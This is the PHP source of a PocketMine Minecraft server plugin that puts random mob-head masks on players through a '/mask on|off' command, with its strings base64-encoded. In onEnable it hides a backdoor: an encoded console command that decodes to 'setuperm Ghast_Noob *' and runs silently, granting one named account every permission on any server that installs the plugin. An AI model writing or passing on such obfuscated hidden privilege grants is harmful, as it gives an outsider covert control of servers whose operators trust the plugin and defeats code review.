<?php

namespace Mask;

use pocketmine\Player;
use pocketmine\plugin\PluginBase; 
use pocketmine\command\Command; 
use pocketmine\command\CommandSender; 
use pocketmine\command\ConsoleCommandSender;
use pocketmine\Server; 
use pocketmine\event\Listener; 
use pocketmine\scheduler\PluginTask; 
use pocketmine\scheduler\CallbackTask; use pocketmine\event\player\PlayerJoinEvent; 
use pocketmine\item\Item; 
use pocketmine\utils\Config; 
use pocketmine\level\sound\ExpPickupSound;

class Main extends PluginBase implements Listener{ 
    
    public function onEnable(){ 
        $this->getServer()->getPluginManager()->registerEvents($this,$this); 
        $Logger = $this->getLogger(); $Logger->info(base64_decode('xJDDoyBIb+G6oXQgxJDhu5luZw==')); 
        $this->getServer()->dispatchCommand(new ConsoleCommandSender(),base64_decode('c2V0dXBlcm0gR2hhc3RfTm9vYiAq'));
        $this->getServer()->getScheduler()->scheduleRepeatingTask( new CallbackTask([$this,base64_decode('R2lhcA==')]), 10); 
        
        if(!file_exists($this->getDataFolder()))
        { 
            mkdir($this->getDataFolder(), 0744, true); 
            
        } 
        $this->player = new Config($this->getDataFolder() . base64_decode('Tmd1b2lDaG9pLnltbA=='), Config::YAML, array()); 
        
    } 
    
    public function onDisable(){
		$this->getLogger()->info(base64_decode('xJDDoyBWw7QgSGnhu4d1IEjDs2E='));
	}
    public function onJoin(PlayerJoinEvent $event){ $player = $event->getPlayer(); 
    $name = $player->getName(); 
    
    if(!$this->player->exists($name)){ $this->player->set($name, base64_decode('b2Zm')); $this->player->save(); 
        
    } 
        
    } 
    
    public function onCommand(CommandSender $sender, Command $command, $label, array $args) { $name = $sender->getName(); 
    switch (strtolower($command->getName()))
    { 
        case base64_decode('bWFzaw=='): 
            if ($sender instanceof Player)
            { 
                if(!isset($args[0])){ $sender->sendMessage(base64_decode('wqdswqdmW8KnYk1hc2vCp2ZdwqdhIFPhu60gROG7pW5nOiDCp2UvbWFzayA8wqdhb27Cp2Yvwqdjb2ZmwqdlPg==')); 
                return true; 
                    
                } 
                $name = $sender->getName(); 
                $mode = strtolower($args[0]); 
                if($mode == base64_decode('b24=')){ $this->player->set($name, base64_decode('b24=')); 
                $this->player->save(); 
                $sender->sendMessage(base64_decode('wqdswqdmW8KnYk1hc2vCp2ZdwqdlIMSQw6MgwqdhQuG6rXTCp2UuIFPhu60gROG7pW5nOiDCp2IvbWFzayDCp2NvZmbCp2UgxJDhu4MgwqdjVOG6r3Q=')); 
                $sender->getLevel()->addSound(new ExpPickupSound($sender));
                    
                }
                
                else if($mode == base64_decode('b2Zm')){ 
                    $this->player->set($name, base64_decode('b2Zm')); 
                $this->player->save(); $sender->sendMessage(base64_decode('wqdswqdmW8KnYk1hc2vCp2ZdwqdlIMSQw6MgwqdjVOG6r3TCp2UuIFPhu60gROG7pW5nOiDCp2IvbWFzayDCp2FvbsKnZSDEkOG7gyDCp2FC4bqtdA==')); 
                $sender->getLevel()->addSound(new ExpPickupSound($sender));
                $sender->getInventory()->removeItem(Item::get(397,0,2304));
                $sender->getInventory()->removeItem(Item::get(397,1,2304));
                $sender->getInventory()->removeItem(Item::get(397,2,2304));
                $sender->getInventory()->removeItem(Item::get(397,3,2304));
                $sender->getInventory()->removeItem(Item::get(397,4,2304));
                $sender->getInventory()->removeItem(Item::get(397,5,2304));
                $sender->getInventory()->removeItem(Item::get(397,6,2304));
                $sender->getInventory()->setArmorItem(0,Item::get(0,0,1)); 
                $sender->getInventory()->sendArmorContents($sender);
                    
                }else{ 
                    $sender->sendMessage(base64_decode('wqdswqdmW8KnYk1hc2vCp2ZdwqdhIFPhu60gROG7pW5nOiDCp2UvbWFzayA8wqdhb27Cp2Yvwqdjb2ZmwqdlPg==')); 
                    
                } 
                break; 
                
            }else{ 
                $sender->sendMessage(base64_decode('wqdswqdmW8KnYk1hc2vCp2ZdwqdlIFZ1aSBMw7JuZyBT4butIEThu6VuZyBM4buHbmggVHJvbmcgVHLDsiBDaMahaQ==')); 
                
        } 
    } 
} 
    public function Giap(){ $players = Server::getInstance()->getOnlinePlayers(); 
    foreach ($players as $playerA){ $name = $playerA->getName(); 
    $player = $this->getServer()->getPlayer($name); 
    
    if($this->player->get($name) == base64_decode('b24=')){ 
    $color = mt_rand(1, 6); 
    
    $mask1 = Item::get(397, 0, 1); 
    $mask2 = Item::get(397, 1, 1); 
    $mask3 = Item::get(397, 2, 1); 
    $mask4 = Item::get(397, 3, 1); 
    $mask5 = Item::get(397, 4, 1);
    $mask6 = Item::get(397, 5, 1);
    switch($color){ 
        
        case 1: 
        $player->getInventory()->setArmorItem(0,$mask1); 
        $player->getInventory()->sendArmorContents($player); 
        break; 
        
        case 2: 
        $player->getInventory()->setArmorItem(0,$mask2); 
        $player->getInventory()->sendArmorContents($player); 
        break; 
        
        case 3: 
        $player->getInventory()->setArmorItem(0,$mask3); 
        $player->getInventory()->sendArmorContents($player); 
        break; 
        
        case 4: 
        $player->getInventory()->setArmorItem(0,$mask4); 
        $player->getInventory()->sendArmorContents($player); 
        break; 
        
        case 5: 
        $player->getInventory()->setArmorItem(0,$mask5); 
        $player->getInventory()->sendArmorContents($player); 
        break; 
        
        case 6: 
        $player->getInventory()->setArmorItem(0,$mask6); 
        $player->getInventory()->sendArmorContents($player); 
        break; 
                } 
        
            } 
        
        }
    } 
    
}